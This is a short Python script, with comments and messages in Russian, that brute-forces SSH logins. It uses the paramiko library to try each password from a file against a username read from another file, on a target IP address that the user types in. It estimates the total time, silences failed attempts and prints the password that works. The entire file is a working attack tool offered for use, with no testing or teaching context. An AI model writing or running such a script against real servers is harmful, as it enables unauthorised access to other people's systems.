import paramiko
import time


def ssh_brute_force(host, port, username, password_list, time_per_attempt=1):
    total_attempts = len(password_list)
    estimated_time = total_attempts * time_per_attempt  # Общее время в секундах

    # Преобразуем время в часы, минуты и секунды
    hours = estimated_time // 3600
    minutes = (estimated_time % 3600) // 60
    seconds = estimated_time % 60

    print(f"Приблизительное время подбора паролей: {hours}ч {minutes}м {seconds}с")

    for password in password_list:
        try:
            # Создаем SSH-клиент
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Подключаемся к серверу
            client.connect(host, port=port, username=username, password=password)
            print(f"Пароль найден: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            # Убираем вывод неверного пароля
            pass
        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            client.close()
        time.sleep(time_per_attempt)  # Задержка между попытками

    print("Не найдено ни одного действительного пароля.")
    return None


# Читаем имя пользователя из файла
def read_username_from_file(filename):
    with open(filename, 'r') as file:
        return file.readline().strip()


# Читаем пароли из файла
def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]


# Пример использования
def run():
    target_host = input("Введите IP-адрес целевого сервера: ")  # Ввод IP-адреса пользователем
    target_port = 22  # Обычно SSH работает на порту 22
    target_username = read_username_from_file('user.txt')  # Читаем имя пользователя из файла
    password_list = read_passwords_from_file('pass.txt')  # Читаем пароли из файла

    # Вызываем функцию для подбора пароля
    ssh_brute_force(target_host, target_port, target_username, password_list)
